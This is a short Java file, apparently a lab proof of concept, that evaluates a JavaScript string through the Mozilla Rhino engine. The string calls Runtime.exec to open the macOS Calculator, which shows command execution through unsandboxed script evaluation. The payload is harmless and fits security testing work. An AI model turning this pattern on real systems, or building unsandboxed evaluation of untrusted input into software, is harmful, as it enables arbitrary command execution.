package com.lab;

import org.mozilla.javascript.Context;

public class RhinoRceTest {
    public static void main(String[] args) {
        String poc = "java.lang.Runtime.getRuntime().exec('open -na Calculator')";
        Context cx = Context.enter();
        cx.evaluateString(cx.initStandardObjects(), poc, "", 1, null);
    }
}
